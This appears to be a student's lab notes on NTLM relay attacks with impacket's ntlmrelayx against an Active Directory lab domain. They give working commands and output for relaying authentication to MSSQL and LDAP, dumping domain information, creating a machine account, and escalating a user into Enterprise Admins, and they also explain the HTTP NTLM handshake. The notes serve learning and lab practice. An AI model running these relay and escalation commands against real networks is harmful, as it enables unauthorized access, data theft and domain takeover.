
---
As a client, we can relay `NTLM` authentication `over` various protocols:

- [HTTP(S)](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/clients/httprelayclient.py)
- [IMAP](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/clients/imaprelayclient.py)
- [LDAP(S)](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/clients/ldaprelayclient.py)
- [MSSQL](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/clients/mssqlrelayclient.py)
- [RPC](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/clients/rpcrelayclient.py)
- [SMBv/1/2/3](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/clients/smbrelayclient.py)
- [SMTP](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/clients/smtprelayclient.py)

As a server, we can relay `NTLM` authentication `from` a limited number of protocols:

- [HTTP(S)](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/servers/httprelayserver.py)
- [RAW](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/servers/rawrelayserver.py) (as described in the [Initial support for raw NTLM relay server for lsarelayx](https://github.com/fortra/impacket/pull/1190) PR, this server is protocol agnostic, and it is designed to accept raw `NTLM` messages directly from third-party relay applications, especially [lsarelayx](https://github.com/CCob/lsarelayx).)
- [SMBv/1/2/3](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/servers/smbrelayserver.py)
- [WCF](https://github.com/fortra/impacket/blob/master/impacket/examples/ntlmrelayx/servers/wcfrelayserver.py) ([Windows Communication Foundation](https://learn.microsoft.com/en-us/dotnet/framework/wcf/whats-wcf))
#### Cross-protcol Relaying Demo
![](assets/Pasted%20image%2020261021200036.png)

|**Relay Authentication From**|**Relay Authentication Over**|**Cross-protocol?**|
|:--|:--|:--|
|`HTTP`(`S`)|`HTTP`(`S`)|`No`|
|`HTTP`(`S`)|`IMAP` \| `LDAP`(`S`) \| `MSSQL` \| `RPC` \| `SMBv/1/2/3` \| `SMTP`|`Yes`|
|`SMBv/1/2/3`|`SMBv/1/2/3`|`No`|
|`SMBv/1/2/3`|`HTTP`(`S`) \| `IMAP` \| `LDAP`(`S`) \| `MSSQL` \| `RPC` \| `SMTP`|`Yes`|
|`WCF`|`HTTP`(`S`) \| `IMAP` \| `LDAP`(`S`) \| `MSSQL` \| `RPC` \| `SMBv/1/2/3` \| `SMTP`|`Yes`|
[The Hacker Recipes' Table](https://www.thehacker.recipes/ad/movement/ntlm/relay#theory)
![](assets/Pasted%20image%2020261021200751.png)
### NTLM Relay over MSSQL
[mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) is a Python script from the impacket family, that implements [Tabular Data Stream Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/b46a581a-39de-4745-b076-ec4dbb7d13ec) (`TDS`) and [SQL Server Resolution Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/mc-sqlr/1ea6e25f-bff9-4364-ba21-5dc449a601b7) (`SSRP`) to connect to `MSSQL` database servers and query data from them.
```bash
hcx05@htb[/htb]$ sudo ntlmrelayx.py -t mssql://172.16.117.60 -smb2support -socks

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>
ntlmrelayx>
[*] SMBD-Thread-10: Received connection from 172.16.117.3, attacking target mssql://172.16.117.60
[*] Authenticating against mssql://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/NPORTS@172.16.117.60(1433) to active SOCKS connection. Enjoy
```
**Note:** For any `post-relay` attacks targeting `MSSQL`, you must switch to the `root` user by using the command `sudo su -` before running `ntlmrelayx`.

**Note:** Windows patched the `NTLM self-relay` attack on all modern systems.

To avoid **NTLM self-relay** or reflection, we can either turning off the HTTP server using the `--no-http-server` option to prevent NPORTS's HTTP connections, editing the `Responder.conf` to not respond to requests `from TargetIp` or using `-tf` instead of a single target, to enable `multi-relay`.

```bash
hcx05@htb[/htb]$ proxychains -q mssqlclient.py INLANEFREIGHT/nports@172.16.117.60 -windows-auth -no-pass

Impacket v0.11.0 - Copyright 2023 Fortra

[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (INLANEFREIGHT\nports  dbo@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonate
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```
The option `-windows-auth` forces Windows authentication instead of the default SQL authentication, while `-no-pass` prevents `mssqclient.py` from prompting us for a password, as we will abuse the authenticated session established by `ntlmrelayx`.

We then can query the `MSSQL` server and exfiltrate the data within it; for example, we can enumerate all the databases available using `enum_db`:
```sql
SQL (INLANEFREIGHT\nports  dbo@master)> enum_db

name            is_trustworthy_on   
-------------   -----------------   
master                          0   
tempdb                          0   
model                           0   
msdb                            1   
development01                   0
```
#### Query Execution
```bash
hcx05@htb[/htb]$ sudo ntlmrelayx.py -t mssql://INLANEFREIGHT\\NPORTS@172.16.117.60 -smb2support -q "SELECT name FROM sys.databases;"

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>

[*] Servers started, waiting for connections
[*] SMBD-Thread-5: Received connection from 172.16.117.3, attacking target mssql://172.16.117.60
[*] Authenticating against mssql://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
[*] Executing SQL: SELECT name FROM sys.databases;
name            
-------------   
master          
tempdb          
model           
msdb            
development01 
<SNIP>
```
### NTLM Relay over LDAP
#### Domain Enumeration
By default, when using the `ldap://` scheme, `ntlmrelayx` will try to dump domain information, add a new domain admin, and escalate privileges via misconfigured `ACLs`/`DACLs` attacks. 
 
We can deactivate any of these attacks using specific options: 
 - `--no-da` disables adding a domain admin.
 - `--no-acl` prevents abusing misconfigured `ACLs`. 
 - `--lootdir`/`-l` option allows specifying a directory where `ntlmrelayx` will dump the LDAP domain information.

Setting `Responder` `SMB` and `HTTP` servers to `Off`:
```bash
sed -i "s/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/" Responder/Responder.conf
```
Because DC usually requests `SMB signing`, it means that we can't progress SMB-to-SMB NTLM relya attack. 
```bash
hcx05@htb[/htb]$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections

[*] SMBD-Thread-5: Received connection from 172.16.117.60, attacking target ldap://172.16.117.3
[!] The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)
```
Sometimes this message appears:
The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)

DC always require `session signing`, therefore, when we try to relay `SMB NTLM` authentication over `LDAP` on the DC, it will fail, as the DC will request the client to perform `session signing`.
#### Bypass Session Signing
CVEs like `Drop the MIC` (`CVE-2019-1040`), `Drop the MIC 2` (`CVE-2019-1166`) and `Your Session Key is my Session Key` (`CVE-2019-1019`) can exploit.

Use [CVE-2019-1040 Scanner](https://github.com/fox-it/cve-2019-1040-scanner/tree/master) to check whether a relay target is vulnerable to `CVE-2019-1040`, and if it is, we can utilize `ntlmrelayx`'s `--remove-mic` option.

```bash
hcx05@htb[/htb]$ python3 scan.py DomainName/UserName$:'Password'@172.16.117.3

[*] CVE-2019-1040 scanner by @_dirkjan / Fox-IT - Based on impacket by SecureAuth
[*] Target 172.16.117.3 is not vulnerable to CVE-2019-1040 (authentication was rejected)
```
`HTTP NTLM` authentication can be relayed over `LDAP` since `HTTP` does not support `session signing` and therefore, the DC does not/cannot request it.
```bash
hcx05@htb[/htb]$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --lootdir ldap_dump

<SNIP>
[*] HTTPD(80): Connection from 172.16.117.60 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/PETER SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
```
```bash
hcx05@htb[/htb]$ ls ldap_dump/

domain_computers_by_os.html  domain_computers.html  domain_groups.grep  domain_groups.json  domain_policy.html  domain_trusts.grep  domain_trusts.json          domain_users.grep  domain_users.json
domain_computers.grep        domain_computers.json  domain_groups.html  domain_policy.grep  domain_policy.json  domain_trusts.html  domain_users_by_group.html  domain_users.html
```
#### Accounts Creation
```bash
hcx05@htb[/htb]$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --no-da --no-acl --add-computer 'plaintext$'

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
<SNIP>

[*] Servers started, waiting for connections
[*] HTTPD(80): Connection from 172.16.117.60 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/PETER SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Adding a machine account to the domain requires TLS, but ldap:// scheme provided. Switching target to LDAPS via StartTLS
[*] Attempting to create computer in: CN=Computers,DC=INLANEFREIGHT,DC=LOCAL
[*] Adding new computer with username: plaintext$ and password: o6@ekK5#rlw2rAe result: OK
```
`LDAPS` is required for adding machine accounts; however, the scheme we provided is `ldap://`. In older versions of `ntlmrelayx`, this attack would fail.

After the [Implementing StartTLS](https://github.com/fortra/impacket/pull/1305) PR, `ntlmrelayx` bypasses `LDAP Channel Binding` via the `StartTLS` mechanism. A great detail blog: [Bypassing LDAP Channel Binding with StartTLS](https://offsec.almond.consulting/bypassing-ldap-channel-binding-with-starttls.html)
#### Privileges Escalation via ACLs Abuse
This is only possible if the relayed account has high-privilege permissions in the domain (i.e., add an account to a high-privilege group such as the Domain Admins group or edit the domain object's DACL).
```bash
hcx05@htb[/htb]$ sudo ntlmrelayx.py -t ldap://172.16.117.3 -smb2support --escalate-user 'plaintext$' --no-dump -debug

Impacket v0.11.0 - Copyright 2023 Fortra

<SNIP>

[*] Servers started, waiting for connections
[*] HTTPD(80): Connection from 172.16.117.60 controlled, attacking target ldap://172.16.117.3
[*] HTTPD(80): Authenticating against ldap://172.16.117.3 as INLANEFREIGHT/NPORTS SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[+] User is a member of: [DN: CN=SQL Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL - STATUS: Read - READ TIME: 2023-07-24T20:23:28.703082
    name: SQL Admins
    objectSid: S-1-5-21-1207890233-375443991-2397730614-1153
]
[+] User is a member of: [DN: CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL - STATUS: Read - READ TIME: 2023-07-24T20:23:28.706705
    distinguishedName: CN=Domain Users,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
    name: Domain Users
    objectSid: S-1-5-21-1207890233-375443991-2397730614-513
]
[+] Permission found: Full Control on CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL; Reason: GENERIC_ALL via CN=SQL Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[+] Performing Group attack
[*] Adding user: plaintext to group Enterprise Admins result: OK
[*] Privilege escalation successful, shutting down...
```
### NTLM Relay over HTTP
The [NTLM over HTTP Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ntht/f09cf6e1-529e-403b-a8a5-7368ee096a6a) (`MS-NTHT`/`NTHT`) specifies how `NTLM` authentication takes place over `HTTP`.
```http
GET protected/unlimitedCubes.php
```
The web server responds to the request with the [401](https://www.rfc-editor.org/rfc/rfc9110#section-15.5.2) (`Unauthorized`) response status and requests the use of `NTLM` challenge/authentication to access this resource by sending the [WWW-Authenticate](https://www.rfc-editor.org/rfc/rfc9110#section-11.6.1) response header with the value `NTLM`:
```http
HTTP/1.1 401 Unauthorized
WWW-Authenticate: NTLM
```
Knowing that the web server is requesting `NTLM` authentication, the web client obtains the local user credentials using the [NTLMSSP](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/security-support-provider-interface-architecture#BKMK_NTLMSSP) security package and then generates a new `GET` request to the web server. The request contains an [Authorization](https://www.rfc-editor.org/rfc/rfc9110#section-11.6.2) header with a base64-encoded `NTLM` `NEGOTIATE_MESSAGE` in `NTLM`-data:
```HTTP
GET protected/unlimitedCubes.php
Authorization: NTLM tESsBmE/yNY3lb6a0Ls8Ks19wQX1Lf36vVQEZNqwQn0s8Unew
```
When receiving the response from the web client, the web server decodes the base64-encoded `NTLM`-data contained within the `Authorization` header and passes it to its implementation of `MS-NLMP`. If it accepts this authentication data, the server responds with an HTTP `401` status code and a `WWW-Authenticate` header with an `NTLM` `CHALLENGE_MESSAGE` in `NTLM`-data:
```HTTP
HTTP/1.1 401 Unauthorized
WWW-Authenticate: NTLM yNY3lb6a0L6vVxOp3MxIQEZNqwQn0s8UNew33KdZvs1Onv
```
The web client then decodes the base64-encoded `NTLM`-data contained within the `WWW-Authenticate` header and passes it to its implementation of `MS-NLMP`. If this authentication data is valid, the client responds by reissuing the `GET` request with an `Authorization` header that contains an `NTLM` `AUTHENTICATE_MESSAGE` in `NTLM`-data:
```HTTP
GET protected/unlimitedCubes.php
Authorization: NTLM kGaXHz6/owHcWRlvGFk8ReUa1O7dNmQL2dZKHo=QEZNqwQn0s8U
```
At last, the web server decodes the base64-encoded `NTLM`-data contained within the `Authorization` header and passes it to its implementation of `MS-NLMP`. If it accepts this authentication data from the web client, the web server responds with an HTTP [Successful 2xx code](https://www.rfc-editor.org/rfc/rfc9110#name-successful-2xx), indicating success, in addition to the requested content. In case the web client we are using (such as browsers) does not support the `NTLM` authentication scheme, we can use the [Proxy-Ez](https://github.com/synacktiv/Prox-Ez) proxy, which can handle all HTTP authentication schemes. Moreover, we can utilize the `NTLMParse` utility within the [ADFSRelay](https://github.com/praetorian-inc/ADFSRelay/) repo to decode base64-encoded `NTLM` messages.
### NTLM Relay over RPC
### NTLM Relay over All Protocols
Modify the relay target definition to use the `all://` scheme:
```bash
hcx05@htb[/htb]$ cat relayTargets.txt

all://172.16.117.50
all://172.16.117.60
```
Set all of `Responder`'s servers to `Off`
```bash
sed -i '4,18s/= On/= Off/g' Responder.conf
```






